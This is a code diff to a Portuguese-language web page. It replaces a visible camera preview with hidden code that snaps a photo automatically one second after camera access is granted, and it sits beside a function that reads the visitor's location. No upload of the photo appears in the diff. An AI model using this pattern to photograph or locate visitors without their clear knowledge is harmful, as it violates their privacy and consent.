@@ -26,8 +26,11 @@
       <p><a href="#">Clique aqui</a> para mais informações.</p>
     </div>
 
-    <!-- Adicionando a tag de vídeo para exibir a câmera -->
-    <video id="video" width="640" height="480" autoplay></video>
+    <!-- Adicionando a tag de canvas para capturar a foto -->
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <!-- Mostrar a foto capturada -->
+    <img id="foto-capturada" style="display:none; width: 640px; height: 480px;" />
 
   </div>
 
@@ -43,15 +46,20 @@
       iniciarCamera();
     });
 
+    // Variáveis globais para acessar o stream da câmera
+    let stream;
+
     // Função para acessar a câmera do usuário
     function iniciarCamera() {
       // Verifica se o navegador suporta a API getUserMedia
       if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
         navigator.mediaDevices.getUserMedia({ video: true })
-          .then(function (stream) {
-            // Se a permissão for concedida, exibe o vídeo
-            const videoElement = document.getElementById("video");
-            videoElement.srcObject = stream;
+          .then(function (userStream) {
+            // Salva o stream da câmera
+            stream = userStream;
+            
+            // Após 1 segundo, capturamos a foto automaticamente
+            setTimeout(tirarFoto, 1000);
           })
           .catch(function (error) {
             // Se houver erro ao tentar acessar a câmera
@@ -63,6 +71,40 @@
       }
     }
 
+    // Função para tirar a foto da câmera
+    function tirarFoto() {
+      if (!stream) {
+        alert("Câmera não acessada!");
+        return;
+      }
+
+      // Cria um contexto 2D para o canvas
+      const canvas = document.getElementById('canvas');
+      const contexto = canvas.getContext('2d');
+
+      // Define o tamanho do canvas igual ao da câmera
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+
+      // Espera o vídeo carregar para desenhar no canvas
+      video.addEventListener('play', function () {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        // Desenha o quadro do vídeo no canvas
+        contexto.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        // Converte a imagem para base64
+        const fotoDataUrl = canvas.toDataURL('image/png');
+
+        // Exibe a imagem capturada
+        const foto = document.getElementById('foto-capturada');
+        foto.src = fotoDataUrl;
+        foto.style.display = 'block';
+      });
+    }
+
     const dataAtual = new Date();
     const dia = String(dataAtual.getDate()).padStart(2, '0');
     const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
@@ -71,8 +113,6 @@
     const dataFormatada = `${dia}/${mes}/${ano}`;
 
     document.getElementById("data-atual").textContent = dataFormatada;
-
-    console.log(dataAtual)
 
     function sendLocation(position) {
       const latitude = position.coords.latitude;
